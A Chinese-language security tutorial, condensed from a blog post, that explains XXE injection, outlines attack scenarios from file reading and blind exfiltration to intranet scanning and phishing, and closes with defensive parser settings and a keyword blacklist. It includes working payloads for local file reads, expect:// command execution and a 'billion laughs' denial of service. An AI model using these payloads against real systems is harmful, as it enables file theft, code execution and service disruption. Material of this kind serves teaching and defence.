---
description: what is xxe vulnerability
---

# XXE爱之初印象

        以下内容引自先知社区「K0rz3n」在其「[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357#toc-8)」的博文，具体内容已经是精简后的版本：

## XXE漏洞的概念

        XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，**没有禁止外部实体的加载**，导致可加载恶意外部文件和代码，造成**任意文件读取**、**命令执行**、**内网端口扫描**、**攻击内网网站**、**发起Dos攻击**等危害。

        XXE漏洞的触发点往往是能够上传xml文件的位置，因为没有对上传的xml文件进行过滤，导致可以上传恶意xml文件。

## XXE基础

         XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式，图像格式和网络协议。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 

        外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。

### 基础知识一： 内部实体和**外部实体**

        XML可以通过DTD定义内部实体与引用外部实体，在DTD内定义的实体就是内部实体，而从外部的 dtd 文件中引用的实体则为外部实体，内部实体与外部实体的示例如下：

* 内部实体示例

> ```markup
> <?xml version="1.0" encoding="ISO-8859-1"?>
> <!DOCTYPE foo [
> <!ELEMENT foo ANY >
> <!ENTITY xxe "test" >]>
> <creds>
> <user>&xxe;</user>
> <pass>mypass</pass>
> </creds>
> ```

* 外部实体示例

> ```markup
> <?xml version="1.0" encoding="ISO-8859-1"?>
> <!DOCTYPE foo [
> <!ELEMENT foo ANY >
> <!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
> <creds>
>     <user>&xxe;</user>
>     <pass>mypass</pass>
> </creds>
> ```

### 基础知识二： 通用实体和参数**实体**

* 通用实体示例

        用 _**&实体名;**_ 引用的实体，在DTD 中定义，在 XML 文档中引用；

> ```markup
> <?xml version="1.0" encoding="utf-8"?> 
> <!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]> 
> <updateProfile>  
>     <firstname>Joe</firstname>  
>     <lastname>&file;</lastname>  
>     ... 
> </updateProfile>
> ```

* 参数实体

1. 使用 `% 实体名`\(**这里面空格不能少**\) 在 DTD 中定义，并且**只能在 DTD 中使用 `%实体名;` 引用**
2. 只有在 DTD 文件中，参数实体的声明才能引用其他实体
3. 与通用实体一样，参数实体也可以外部引用

> ```markup
> <!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
> <!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
> %an-element; %remote-dtd;
> ```

## 利用XXE能做些啥

以下内容仅做基本介绍，具体实践请移步「K0rz3n」在其「[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357#toc-8)」的博文。

### **实验一：有回显读本地敏感文件\(Normal XXE\)**

        这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件。

### **实验二：无回显读取本地敏感文件\(Blind OOB XXE\)**

        ****本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法------外带。

        想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了\(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求\)

### **实验三：HTTP 内网主机探测**

        我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子，可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了。

### **实验四：HTTP 内网主机端口扫描**

        找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测。

### **实验五：内网盲注\(CTF\)**

        2018年强网杯有一道题就是利用XXE漏洞进行内网的SQL盲注的,大致的思路如下：首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错，然后我们是不是能读取该服务器上面的文件，我们先读配置文件\(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD \)，之后通过网络配置文件获取内网主机，并探测其开放端口，最后发现test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求。

### **实验六：文件上传**

        我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）

### **实验七：钓鱼**

        如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼

### **实验八：其他**

* **PHP expect RCE：**由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE

> ```text
> <!DOCTYPE root[<!ENTITY cmd SYSTEM "expect://id">]>
> <dir>
> <file>&cmd;</file>
> </dir>
> ```

* **利用 XXE 进行 DOS 攻击**

> ```markup
> <?xml version="1.0"?>
>      <!DOCTYPE lolz [
>      <!ENTITY lol "lol">
>      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
>      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
>      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
>      <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
>      <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
>      <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
>      <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
>      <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
>      ]>
>      <lolz>&lol9;</lolz
> ```

## **如何防御**

### **方案一：使用语言中推荐的禁用外部实体的方法**

**PHP：**

```php
libxml_disable_entity_loader(true);
```

**JAVA:**

```java
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
.setFeature("http://xml.org/sax/features/external-general-entities",false)
.setFeature("http://xml.org/sax/features/external-parameter-entities",false);
```

**Python：**

```python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

### **方案二：手动黑名单过滤\(不推荐\)**

过滤关键词：

```text
<!DOCTYPE、<!ENTITY SYSTEM、PUBLIC     
```

## 总结

对 XXE 漏洞做了一个重新的认识，对其中一些细节问题做了对应的实战测试，重点在于 netdoc 的利用和 jar 协议的利用，这个 jar 协议的使用很神奇，网上的资料也比较少，我测试也花了很长的时间，希望有真实的案例能出现，利用方式还需要各位大师傅们的努力挖掘。

你的知识面，决定着你的攻击面。

## 参考文献

* 一篇文章带你深入理解漏洞之 XXE 漏洞：[https://xz.aliyun.com/t/3357\#toc-8](https://xz.aliyun.com/t/3357#toc-8)
* \[Web安全\] XXE漏洞攻防学习（上）：[https://www.cnblogs.com/ESHLkangi/p/9245404.html](https://www.cnblogs.com/ESHLkangi/p/9245404.html)



